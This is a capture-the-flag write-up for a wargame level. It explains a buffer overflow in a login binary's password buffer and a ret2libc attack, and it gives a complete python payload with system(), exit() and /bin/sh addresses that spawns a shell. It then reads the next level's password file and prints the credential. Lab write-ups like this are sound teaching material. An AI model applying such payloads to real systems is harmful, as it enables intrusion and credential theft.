# Level01

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we need to input a login and a password in what looks like an auth system. Using our analysis we know that login is `dat_wil` and password is `admin` but no matter what the password is it will trigger a "bad password" message then exit. What we can do here is to create a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) and use it to make a [ret2libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack).

All we need for this is:

- An exploitable buffer (the one used for password).
- Its offset (**80** bytes)
- Address of `system()`, `exit()` and `/bin/sh` (respectively `0xf7e6aed0`, `0xf7e5eb70` and `0xf7f897ec`)

Then we simply need to construct a payload that will shift outside of the buffer to write address of `system()` then `exit()` and finally `/bin/sh` to get a shell!

```shell
  $> (python -c "print 'dat_wil\n' + '\x90' * 80 + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]"; cat) | ./level01 
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: verifying username....

  Enter Password: 
  nope, incorrect password...

  cat /home/users/level02/.pass
  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

So next user credentials pair is `level02:PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`.

Check [here](../source.c) for reproduction source-code of this binary.